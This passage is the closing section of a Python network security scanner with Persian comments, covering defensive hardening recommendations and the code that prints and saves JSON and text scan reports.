                'description': 'Use firewall rules to limit access to trusted IPs only'
            },
            {
                'priority': 'High',
                'action': 'Update all software to latest versions',
                'description': 'Outdated software contains known vulnerabilities'
            },
            {
                'priority': 'High',
                'action': 'Configure proper SSL/TLS certificates',
                'description': 'Replace self-signed certificates with trusted ones'
            },
            {
                'priority': 'Medium',
                'action': 'Implement security headers',
                'description': 'Add X-Frame-Options, CSP, HSTS, etc.'
            },
            {
                'priority': 'Medium',
                'action': 'Disable unnecessary services',
                'description': 'Turn off services not in use (FTP, Telnet, etc.)'
            },
            {
                'priority': 'Low',
                'action': 'Configure proper SPF and DMARC records',
                'description': 'Prevent email spoofing and phishing'
            },
            {
                'priority': 'Low',
                'action': 'Regular security audits',
                'description': 'Schedule periodic security assessments'
            }
        ]
        
        self.results['recommendations'] = recommendations
    
    def generate_comprehensive_report(self):
        """تولید گزارش جامع"""
        self.results['scan_info']['end_time'] = datetime.now().isoformat()
        
        # شمارش یافته‌ها
        critical_count = len(self.results['critical_findings'])
        high_count = len(self.results['high_findings'])
        medium_count = len(self.results['medium_findings'])
        low_count = len(self.results['low_findings'])
        
        print(f"\n{Fore.RED}{'='*100}")
        print(f"{Fore.YELLOW}SECURITY SCAN REPORT - COMPREHENSIVE")
        print(f"{Fore.RED}{'='*100}")
        
        print(f"\n{Fore.CYAN}[SUMMARY]")
        print(f"{Fore.WHITE}Scan Duration: {self.results['scan_info']['start_time']} to {self.results['scan_info']['end_time']}")
        print(f"{Fore.RED}Critical Findings: {critical_count}")
        print(f"{Fore.YELLOW}High Findings: {high_count}")
        print(f"{Fore.BLUE}Medium Findings: {medium_count}")
        print(f"{Fore.GREEN}Low Findings: {low_count}")
        print(f"{Fore.WHITE}Total Services Found: {sum(len(services) for services in self.results['services'].values())}")
        
        if critical_count > 0:
            print(f"\n{Fore.RED}[CRITICAL FINDINGS]")
            for i, finding in enumerate(self.results['critical_findings'], 1):
                print(f"\n{i}. {finding['type']}")
                print(f"   Target: {finding.get('target', 'N/A')}:{finding.get('port', 'N/A')}")
                print(f"   Description: {finding['description']}")
                print(f"   Recommendation: {finding['recommendation']}")
        
        if high_count > 0:
            print(f"\n{Fore.YELLOW}[HIGH FINDINGS]")
            for i, finding in enumerate(self.results['high_findings'], 1):
                print(f"\n{i}. {finding['type']}")
                print(f"   Target: {finding.get('target', 'N/A')}:{finding.get('port', 'N/A')}")
                print(f"   Description: {finding['description']}")
                print(f"   Recommendation: {finding['recommendation']}")
        
        print(f"\n{Fore.GREEN}[RECOMMENDATIONS BY PRIORITY]")
        for rec in self.results['recommendations']:
            color = Fore.RED if rec['priority'] == 'Critical' else \
                   Fore.YELLOW if rec['priority'] == 'High' else \
                   Fore.BLUE if rec['priority'] == 'Medium' else Fore.GREEN
            print(f"\n{color}[{rec['priority']}] {rec['action']}")
            print(f"{Fore.WHITE}   {rec['description']}")
        
        # ذخیره گزارش
        self.save_json_report()
        self.save_text_report()
    
    def save_json_report(self):
        """ذخیره گزارش JSON"""
        filename = f"ultimate_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=4, ensure_ascii=False, default=str)
        
        print(f"\n{Fore.GREEN}[+] JSON report saved to {filename}")
    
    def save_text_report(self):
        """ذخیره گزارش متنی"""
        filename = f"ultimate_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*100 + "\n")
            f.write("ULTIMATE SECURITY SCAN REPORT\n")
            f.write("="*100 + "\n\n")
            
            f.write(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.targets['primary_ip']}\n\n")
            
            f.write("[CRITICAL FINDINGS]\n")
            for finding in self.results['critical_findings']:
                f.write(f"\nType: {finding['type']}\n")
                f.write(f"Target: {finding.get('target', 'N/A')}:{finding.get('port', 'N/A')}\n")
                f.write(f"Description: {finding['description']}\n")
                f.write(f"Recommendation: {finding['recommendation']}\n")
                f.write("-"*50 + "\n")
            
            f.write("\n[RECOMMENDATIONS]\n")
            for rec in self.results['recommendations']:
                f.write(f"\n[{rec['priority']}] {rec['action']}\n")
                f.write(f"Description: {rec['description']}\n")
        
        print(f"{Fore.GREEN}[+] Text report saved to {filename}")
    
    def extract_title(self, html):
        """استخراج عنوان از HTML"""
        title_match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        if title_match:
            return title_match.group(1).strip()
        return 'No title found'

# کلاس FTP برای تست
from ftplib import FTP, error_perm, error_temp

def main():
    """تابع اصلی"""
    try:
        print(f"{Fore.YELLOW}[*] Initializing Ultimate Security Scanner...")
        scanner = UltimateSecurityScanner()
        scanner.run_comprehensive_scan()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical error during scan: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()